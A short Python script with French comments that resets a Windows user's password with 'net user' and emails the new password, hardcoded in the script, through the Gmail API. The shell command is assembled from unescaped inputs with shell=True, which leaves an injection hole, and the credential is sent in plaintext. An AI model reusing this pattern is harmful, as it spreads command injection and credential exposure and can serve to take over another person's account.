import random
import subprocess
import base64
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from email.mime.text import MIMEText

# Étape 1: Générer un code à 6 chiffres
def generate_auth_key():
    return ''.join([str(random.randint(0, 9)) for _ in range(6)])

# Étape 2: Changer le mot de passe de l'utilisateur
def change_user_password(username, new_password):
    command = f"net user {username} {new_password}"
    subprocess.run(command, shell=True, check=True)

# Étape 3: Envoyer l'email
def send_email(auth_key, to_email):
    creds = Credentials.from_authorized_user_file('token.json')
    service = build('gmail', 'v1', credentials=creds)

    message = MIMEText(f'Votre clé d\'authentification est : {auth_key}')
    message['to'] = to_email
    message['from'] = 'oui@gmail.com'
    message['subject'] = 'Clé d\'authentification'
    raw = base64.urlsafe_b64encode(message.as_bytes()).decode()
    message = {'raw': raw}
    service.users().messages().send(userId='me', body=message).execute()

# Paramètres
username = "user"  # Remplacez par le nom d'utilisateur Windows cible
to_email = "non@gmail.com"  # Remplacez par votre adresse e-mail

# Exécution
#auth_key = generate_auth_key()
auth_key = "Ouibiensure567!"
change_user_password(username, auth_key)
send_email(auth_key, to_email)
